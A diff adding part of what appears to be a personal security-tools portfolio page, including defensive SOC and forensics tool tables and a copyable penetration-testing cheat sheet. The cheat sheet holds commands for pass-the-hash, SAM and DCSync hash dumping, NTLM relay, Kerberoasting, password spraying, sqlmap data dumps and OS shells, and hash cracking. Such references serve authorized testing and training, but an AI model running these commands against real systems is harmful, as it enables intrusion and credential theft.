+                  <td>Network IDS/IPS with rule-based detection — Emerging Threats rules, PCAP analysis, Eve JSON output</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- IR Tools -->
+        <div class="tm-subsection" id="soc-ir">
+          <div class="tm-subsection-title">Incident Response &amp; Forensics</div>
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead><tr><th>Tool</th><th>Category</th><th>Use Case</th></tr></thead>
+              <tbody>
+                <tr>
+                  <td>Velociraptor</td>
+                  <td>DFIR Platform</td>
+                  <td>Remote endpoint investigation at scale — VQL queries, artifact collection, memory analysis, timeline</td>
+                </tr>
+                <tr>
+                  <td>TheHive</td>
+                  <td>IR Case Management</td>
+                  <td>Collaborative incident case management — integrates with Cortex for automated enrichment and MISP for IOCs</td>
+                </tr>
+                <tr>
+                  <td>MISP</td>
+                  <td>Threat Intelligence</td>
+                  <td>Open-source threat intel platform — share and receive IOCs (hashes, IPs, domains) across organisations</td>
+                </tr>
+                <tr>
+                  <td>Autopsy / Sleuth Kit</td>
+                  <td>Disk Forensics</td>
+                  <td>Forensic analysis of disk images — file recovery, timeline, keyword search, browser history, registry hives</td>
+                </tr>
+                <tr>
+                  <td>Volatility3</td>
+                  <td>Memory Forensics</td>
+                  <td>Memory dump analysis — extract processes, network connections, injected code, credentials, registry</td>
+                </tr>
+                <tr>
+                  <td>Eric Zimmermann Tools</td>
+                  <td>Windows Forensics</td>
+                  <td>Windows artefact parsers: MFT, prefetch, LNK, Amcache, Shimcache, Registry, event logs</td>
+                </tr>
+                <tr>
+                  <td>chainsaw</td>
+                  <td>Event Log Analysis</td>
+                  <td>Fast EVTX hunting — Sigma rule matching on Windows event logs, hunt for attacker artefacts at scale</td>
+                </tr>
+                <tr>
+                  <td>Hayabusa</td>
+                  <td>Event Log Threat Hunt</td>
+                  <td>Windows event log fast forensics / threat hunting tool — Sigma rules, timeline output, level-based triage</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- Threat Hunting / Automation -->
+        <div class="tm-subsection" id="soc-automation">
+          <div class="tm-subsection-title">Threat Hunting &amp; Automation</div>
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead><tr><th>Tool</th><th>Category</th><th>Use Case</th></tr></thead>
+              <tbody>
+                <tr>
+                  <td>MITRE ATT&amp;CK Navigator</td>
+                  <td>Framework</td>
+                  <td>Map detections, coverage gaps, and threat actor TTPs — highlight what your SIEM detects vs. misses</td>
+                </tr>
+                <tr>
+                  <td>Shuffle</td>
+                  <td>SOAR</td>
+                  <td>Open-source SOAR — automate alert triage workflows: enrich IOCs, block IPs, notify Slack, create tickets</td>
+                </tr>
+                <tr>
+                  <td>Cortex</td>
+                  <td>SOC Automation</td>
+                  <td>Automated observable analysis — run analysers (VirusTotal, Shodan, AbuseIPDB) on IOCs from TheHive</td>
+                </tr>
+                <tr>
+                  <td>OpenCTI</td>
+                  <td>Threat Intel Platform</td>
+                  <td>Structured threat intelligence — store TTPs, actors, campaigns, IOCs linked by relationships in graph form</td>
+                </tr>
+                <tr>
+                  <td>VirusTotal API</td>
+                  <td>IOC Enrichment</td>
+                  <td>Automated hash/IP/domain/URL lookup — integrate into SOAR for alert enrichment without manual lookups</td>
+                </tr>
+                <tr>
+                  <td>GoPhish</td>
+                  <td>Phishing Simulation</td>
+                  <td>Run internal phishing campaigns for security awareness training and email control validation</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- ════════════════════════════════
+           SECTION 7: CHEAT SHEETS
+      ════════════════════════════════ -->
+      <section class="tm-section" id="cheatsheets">
+        <div class="tm-section-header">
+          <span class="tm-section-icon">⚡</span>
+          <h2 class="tm-section-title">Cheat Sheets</h2>
+          <span class="tm-section-badge">Quick Reference</span>
+        </div>
+
+        <div class="tm-tip">
+          Click <strong>Copy</strong> on any block to copy the commands. Replace <code>TARGET</code>, <code>USER</code>,
+          <code>HASH</code>, and <code>DOMAIN</code> with your actual values.
+        </div>
+
+        <!-- Nmap -->
+        <div class="tm-subsection" id="cs-nmap">
+          <div class="tm-subsection-title">Nmap</div>
+
+          <div class="tm-code-block">
+            <div class="tm-code-bar">
+              <span class="tm-code-lang">Discovery &amp; Scanning</span>
+              <button class="tm-copy-btn">Copy</button>
+            </div>
+            <pre><code><span class="comment"># Host discovery (no port scan)</span>
+<span class="cmd">nmap</span> <span class="flag">-sn</span> 192.168.1.0/24
+
+<span class="comment"># Fast top-1000 ports SYN scan</span>
+<span class="cmd">nmap</span> <span class="flag">-sS -T4 --open</span> <span class="val">TARGET</span>
+
+<span class="comment"># Full port scan with service/version detection</span>
+<span class="cmd">nmap</span> <span class="flag">-sS -p- -sV -sC -T4 -oA</span> nmap_full <span class="val">TARGET</span>
+
+<span class="comment"># UDP top-100 ports (slow, run after TCP)</span>
+<span class="cmd">nmap</span> <span class="flag">-sU --top-ports 100 -T3</span> <span class="val">TARGET</span>
+
+<span class="comment"># Vulnerability scripts against open ports</span>
+<span class="cmd">nmap</span> <span class="flag">-sV --script=vuln</span> <span class="val">TARGET</span>
+
+<span class="comment"># SMB enumeration</span>
+<span class="cmd">nmap</span> <span class="flag">-p 445 --script smb-enum-shares,smb-enum-users,smb-vuln-ms17-010</span> <span class="val">TARGET</span>
+
+<span class="comment"># Output all formats (for reporting)</span>
+<span class="cmd">nmap</span> <span class="flag">-sS -p- -sV -sC -oA</span> scan_results <span class="val">TARGET</span></code></pre>
+          </div>
+        </div>
+
+        <!-- ffuf -->
+        <div class="tm-subsection" id="cs-ffuf">
+          <div class="tm-subsection-title">ffuf — Web Fuzzing</div>
+
+          <div class="tm-code-block">
+            <div class="tm-code-bar">
+              <span class="tm-code-lang">Directory &amp; Parameter Fuzzing</span>
+              <button class="tm-copy-btn">Copy</button>
+            </div>
+            <pre><code><span class="comment"># Directory brute-force</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> http://<span class="val">TARGET</span>/FUZZ <span class="flag">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt
+
+<span class="comment"># Filter by status code (show only 200, 301, 302)</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> http://<span class="val">TARGET</span>/FUZZ <span class="flag">-w</span> wordlist.txt <span class="flag">-mc</span> 200,301,302
+
+<span class="comment"># Filter by response size (hide 4096-byte false positives)</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> http://<span class="val">TARGET</span>/FUZZ <span class="flag">-w</span> wordlist.txt <span class="flag">-fs</span> 4096
+
+<span class="comment"># Vhost discovery</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> http://<span class="val">TARGET</span> <span class="flag">-H</span> "Host: FUZZ.<span class="val">TARGET</span>" <span class="flag">-w</span> subdomains.txt <span class="flag">-fs</span> 1234
+
+<span class="comment"># GET parameter fuzzing</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> "http://<span class="val">TARGET</span>/page?FUZZ=value" <span class="flag">-w</span> params.txt <span class="flag">-mc</span> 200
+
+<span class="comment"># POST body fuzzing (JSON)</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> http://<span class="val">TARGET</span>/api/login <span class="flag">-X POST -H</span> "Content-Type: application/json" \
+     <span class="flag">-d</span> '{"username":"FUZZ","password":"password"}' <span class="flag">-w</span> users.txt
+
+<span class="comment"># Recursive directory scan</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> http://<span class="val">TARGET</span>/FUZZ <span class="flag">-w</span> wordlist.txt <span class="flag">-recursion -recursion-depth</span> 3</code></pre>
+          </div>
+        </div>
+
+        <!-- CrackMapExec -->
+        <div class="tm-subsection" id="cs-cme">
+          <div class="tm-subsection-title">CrackMapExec</div>
+
+          <div class="tm-code-block">
+            <div class="tm-code-bar">
+              <span class="tm-code-lang">SMB / WinRM Lateral Movement</span>
+              <button class="tm-copy-btn">Copy</button>
+            </div>
+            <pre><code><span class="comment"># Test credentials across a subnet</span>
+<span class="cmd">crackmapexec</span> smb 192.168.1.0/24 <span class="flag">-u</span> <span class="val">USER</span> <span class="flag">-p</span> <span class="val">PASSWORD</span>
+
+<span class="comment"># Pass-the-Hash authentication</span>
+<span class="cmd">crackmapexec</span> smb <span class="val">TARGET</span> <span class="flag">-u</span> <span class="val">USER</span> <span class="flag">-H</span> <span class="val">HASH</span>
+
+<span class="comment"># Enumerate shares</span>
+<span class="cmd">crackmapexec</span> smb <span class="val">TARGET</span> <span class="flag">-u</span> <span class="val">USER</span> <span class="flag">-p</span> <span class="val">PASSWORD</span> <span class="flag">--shares</span>
+
+<span class="comment"># Dump SAM hashes (local admin required)</span>
+<span class="cmd">crackmapexec</span> smb <span class="val">TARGET</span> <span class="flag">-u</span> <span class="val">USER</span> <span class="flag">-p</span> <span class="val">PASSWORD</span> <span class="flag">--sam</span>
+
+<span class="comment"># Run a command</span>
+<span class="cmd">crackmapexec</span> smb <span class="val">TARGET</span> <span class="flag">-u</span> <span class="val">USER</span> <span class="flag">-p</span> <span class="val">PASSWORD</span> <span class="flag">-x</span> "whoami /all"
+
+<span class="comment"># WinRM shell</span>
+<span class="cmd">crackmapexec</span> winrm <span class="val">TARGET</span> <span class="flag">-u</span> <span class="val">USER</span> <span class="flag">-p</span> <span class="val">PASSWORD</span> <span class="flag">-x</span> "ipconfig"
+
+<span class="comment"># Password spray (1 password, many users) — go slow to avoid lockout</span>
+<span class="cmd">crackmapexec</span> smb <span class="val">TARGET</span> <span class="flag">-u</span> users.txt <span class="flag">-p</span> 'Password123!' <span class="flag">--no-bruteforce --continue-on-success</span></code></pre>
+          </div>
+        </div>
+
+        <!-- Responder -->
+        <div class="tm-subsection" id="cs-responder">
+          <div class="tm-subsection-title">Responder &amp; NTLM Relay</div>
+
+          <div class="tm-code-block">
+            <div class="tm-code-bar">
+              <span class="tm-code-lang">LLMNR Poisoning + Relay</span>
+              <button class="tm-copy-btn">Copy</button>
+            </div>
+            <pre><code><span class="comment"># Start Responder on your interface (captures NTLMv2 hashes)</span>
+<span class="cmd">responder</span> <span class="flag">-I</span> eth0 <span class="flag">-wdPv</span>
+
+<span class="comment"># Responder logs go to /usr/share/responder/logs/</span>
+<span class="comment"># Crack captured hash with hashcat</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 5600</span> hashes.txt /usr/share/wordlists/rockyou.txt
+
+<span class="comment"># For relay (disable SMB/HTTP in Responder.conf first, then run in parallel):</span>
+<span class="comment"># 1. Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off</span>
+<span class="cmd">responder</span> <span class="flag">-I</span> eth0 <span class="flag">-wdPv</span>
+
+<span class="comment"># 2. Run ntlmrelayx targeting hosts without SMB signing</span>
+<span class="cmd">impacket-ntlmrelayx</span> <span class="flag">-tf</span> targets.txt <span class="flag">-smb2support -l</span> loot/
+
+<span class="comment"># Find hosts without SMB signing (relay targets)</span>
+<span class="cmd">crackmapexec</span> smb 192.168.1.0/24 <span class="flag">--gen-relay-list</span> targets.txt</code></pre>
+          </div>
+        </div>
+
+        <!-- Impacket -->
+        <div class="tm-subsection" id="cs-impacket">
+          <div class="tm-subsection-title">Impacket Suite</div>
+
+          <div class="tm-code-block">
+            <div class="tm-code-bar">
+              <span class="tm-code-lang">AD Attacks &amp; Remote Access</span>
+              <button class="tm-copy-btn">Copy</button>
+            </div>
+            <pre><code><span class="comment"># DCSync — dump domain hashes (requires DS-Replication right)</span>
+<span class="cmd">impacket-secretsdump</span> <span class="val">DOMAIN</span>/<span class="val">USER</span>:<span class="val">PASSWORD</span>@<span class="val">DC_IP</span>
+
+<span class="comment"># DCSync with hash</span>
+<span class="cmd">impacket-secretsdump</span> <span class="flag">-hashes</span> :<span class="val">HASH</span> <span class="val">DOMAIN</span>/<span class="val">USER</span>@<span class="val">DC_IP</span>
+
+<span class="comment"># Get Kerberoastable SPNs</span>
+<span class="cmd">impacket-GetUserSPNs</span> <span class="val">DOMAIN</span>/<span class="val">USER</span>:<span class="val">PASSWORD</span> <span class="flag">-dc-ip</span> <span class="val">DC_IP</span> <span class="flag">-request</span>
+
+<span class="comment"># AS-REP Roast (no creds needed)</span>
+<span class="cmd">impacket-GetNPUsers</span> <span class="val">DOMAIN</span>/ <span class="flag">-dc-ip</span> <span class="val">DC_IP</span> <span class="flag">-usersfile</span> users.txt <span class="flag">-no-pass</span>
+
+<span class="comment"># PSExec shell</span>
+<span class="cmd">impacket-psexec</span> <span class="val">DOMAIN</span>/<span class="val">USER</span>:<span class="val">PASSWORD</span>@<span class="val">TARGET</span>
+
+<span class="comment"># WMIexec (stealthier — no service install)</span>
+<span class="cmd">impacket-wmiexec</span> <span class="val">DOMAIN</span>/<span class="val">USER</span>:<span class="val">PASSWORD</span>@<span class="val">TARGET</span>
+
+<span class="comment"># SMB client</span>
+<span class="cmd">impacket-smbclient</span> <span class="val">DOMAIN</span>/<span class="val">USER</span>:<span class="val">PASSWORD</span>@<span class="val">TARGET</span></code></pre>
+          </div>
+        </div>
+
+        <!-- Burp Tips -->
+        <div class="tm-subsection" id="cs-burp">
+          <div class="tm-subsection-title">Burp Suite — Key Tips</div>
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead><tr><th>Feature</th><th>Shortcut / Location</th><th>Usage Tip</th></tr></thead>
+              <tbody>
+                <tr>
+                  <td>Send to Repeater</td>
+                  <td>Ctrl+R</td>
+                  <td>From any captured request — replay and modify without re-browsing</td>
+                </tr>
+                <tr>
+                  <td>Send to Intruder</td>
+                  <td>Ctrl+I</td>
+                  <td>Fuzz marked positions — use Sniper for single param, Pitchfork for credential lists</td>
+                </tr>
+                <tr>
+                  <td>Match &amp; Replace</td>
+                  <td>Proxy → Options → Match and Replace</td>
+                  <td>Automatically modify headers/cookies in every request — swap User-Agent, add headers</td>
+                </tr>
+                <tr>
+                  <td>Scope Control</td>
+                  <td>Target → Scope</td>
+                  <td>Add target to scope — prevents proxy history pollution from third-party requests</td>
+                </tr>
+                <tr>
+                  <td>Decoder</td>
+                  <td>Decoder tab</td>
+                  <td>Quickly decode/encode Base64, URL, HTML, Hex, JWT segments without external tools</td>
+                </tr>
+                <tr>
+                  <td>Comparer</td>
+                  <td>Comparer tab</td>
+                  <td>Diff two responses — spot differences between authenticated and unauthenticated responses</td>
+                </tr>
+                <tr>
+                  <td>Collaborator</td>
+                  <td>Burp menu → Burp Collaborator</td>
+                  <td>Out-of-band detection — test blind SSRF, blind XSS, blind SQLi, DNS interactions</td>
+                </tr>
+                <tr>
+                  <td>Logger / Logger++</td>
+                  <td>Logger tab (ext)</td>
+                  <td>Filter and search all proxy traffic — find specific params, headers, responses quickly</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <div class="tm-code-block">
+            <div class="tm-code-bar">
+              <span class="tm-code-lang">sqlmap — Common Flags</span>
+              <button class="tm-copy-btn">Copy</button>
+            </div>
+            <pre><code><span class="comment"># Test a GET parameter</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> "http://<span class="val">TARGET</span>/page?id=1" <span class="flag">--dbs</span>
+
+<span class="comment"># Test POST request (copy request from Burp to file)</span>
+<span class="cmd">sqlmap</span> <span class="flag">-r</span> request.txt <span class="flag">--dbs --level=3 --risk=2</span>
+
+<span class="comment"># Dump a specific table</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> "http://<span class="val">TARGET</span>/page?id=1" <span class="flag">-D</span> <span class="val">dbname</span> <span class="flag">-T</span> <span class="val">users</span> <span class="flag">--dump</span>
+
+<span class="comment"># Use a session cookie</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> "http://<span class="val">TARGET</span>/page?id=1" <span class="flag">--cookie</span> "session=<span class="val">COOKIE</span>" <span class="flag">--dbs</span>
+
+<span class="comment"># WAF bypass tamper scripts</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> "http://<span class="val">TARGET</span>/page?id=1" <span class="flag">--tamper=space2comment,between</span> <span class="flag">--dbs</span>
+
+<span class="comment"># OS command execution (if stacked queries available)</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> "http://<span class="val">TARGET</span>/page?id=1" <span class="flag">--os-shell</span></code></pre>
+          </div>
+        </div>
+
+        <!-- hashcat quick ref -->
+        <div class="tm-subsection" id="cs-hashcat">
+          <div class="tm-subsection-title">Hashcat — Hash Modes</div>
+
+          <div class="tm-code-block">
+            <div class="tm-code-bar">
+              <span class="tm-code-lang">Common Hash Types</span>
+              <button class="tm-copy-btn">Copy</button>
+            </div>
+            <pre><code><span class="comment"># NTLM (Windows local hash)</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 1000</span> hashes.txt rockyou.txt
+
+<span class="comment"># NTLMv2 / Net-NTLMv2 (captured by Responder)</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 5600</span> ntlmv2.txt rockyou.txt
+
+<span class="comment"># Kerberos TGS (Kerberoasting)</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 13100</span> kerberoast.txt rockyou.txt
+
+<span class="comment"># Kerberos AS-REP (AS-REP Roasting)</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 18200</span> asrep.txt rockyou.txt
+
+<span class="comment"># WPA2 PMKID + EAPOL</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 22000</span> capture.hc22000 rockyou.txt
+
+<span class="comment"># MD5</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 0</span> hashes.txt rockyou.txt
+
+<span class="comment"># SHA-256</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 1400</span> hashes.txt rockyou.txt
+
+<span class="comment"># Rule-based attack (add number/symbol mutations)</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 1000</span> hashes.txt rockyou.txt <span class="flag">-r</span> /usr/share/hashcat/rules/best64.rule
+
+<span class="comment"># Mask attack (8-char password: uppercase + lowercase + digit)</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 1000 -a 3</span> hashes.txt <span class="flag">?u?l?l?l?l?l?d?d</span></code></pre>
+          </div>
+        </div>
+
+      </section>
+
+    </div><!-- /tm-content -->
+  </main>
+</div><!-- /tm-layout -->
+
+<!-- Back to top -->
+<button id="backToTop" title="Back to top">↑</button>
+
+<script>
+  /* Sidebar toggle (mobile) */
+  const sidebarToggle = document.getElementById('sidebarToggle');
+  const sidebar = document.getElementById('sidebar');
+  sidebarToggle.addEventListener('click', () => sidebar.classList.toggle('open'));
+  document.addEventListener('click', e => {
+    if (!sidebar.contains(e.target) && !sidebarToggle.contains(e.target)) {
+      sidebar.classList.remove('open');
+    }
+  });
+
+  /* Back to top */
+  const btt = document.getElementById('backToTop');
+  window.addEventListener('scroll', () => {
+    btt.classList.toggle('visible', window.scrollY > 400);
+  });
+  btt.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+
+  /* Active sidebar link on scroll */
+  const sections = document.querySelectorAll('.tm-section');
+  const sideLinks = document.querySelectorAll('.tm-sidebar-links a');
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        const id = entry.target.id;
+        sideLinks.forEach(a => {
+          a.classList.toggle('active', a.getAttribute('href') === '#' + id);
+        });
+      }
+    });
+  }, { rootMargin: '-20% 0px -70% 0px' });
+  sections.forEach(s => observer.observe(s));
+
+  /* Tool search */
+  const searchInput = document.getElementById('toolSearch');
+  const searchHint  = document.getElementById('searchHint');
+  searchInput.addEventListener('input', () => {
+    const q = searchInput.value.trim().toLowerCase();
+    const rows = document.querySelectorAll('.tm-table tbody tr');
+    let visible = 0;
+    rows.forEach(row => {
+      const text = row.textContent.toLowerCase();
+      const match = !q || text.includes(q);
+      row.classList.toggle('tool-row-hidden', !match);
+      if (match) visible++;
+    });
+    searchHint.textContent = q ? `${visible} tool${visible !== 1 ? 's' : ''} found` : '';
+  });
+
+  /* Copy buttons */
+  document.addEventListener('click', e => {
+    if (e.target.classList.contains('tm-copy-btn')) {
+      const block = e.target.closest('.tm-code-block');
+      const code  = block ? block.querySelector('code') : null;
+      if (!code) return;
+      navigator.clipboard.writeText(code.innerText).then(() => {
+        e.target.textContent = '✓ Copied';
+        e.target.classList.add('copied');
+        setTimeout(() => {
+          e.target.textContent = 'Copy';
+          e.target.classList.remove('copied');
+        }, 2000);
+      });
+    }
+  });
+</script>
+
+<footer style="margin-top:4rem;border-top:1px solid rgba(0,220,130,0.1);padding:2rem;text-align:center;">
+  <div style="font-family:var(--mono);font-size:0.72rem;color:rgba(201,209,217,0.25);letter-spacing:1px;">
+    &copy; 2025 Opeyemi Ariyo &nbsp;·&nbsp;
+    <a href="/" style="color:rgba(0,220,130,0.4);text-decoration:none;">← Back to Portfolio</a> &nbsp;·&nbsp;
+    <a href="https://github.com/opemi-aa/" target="_blank" style="color:rgba(0,220,130,0.4);text-decoration:none;">GitHub</a>
+  </div>
+</footer>
+</body>
+</html>
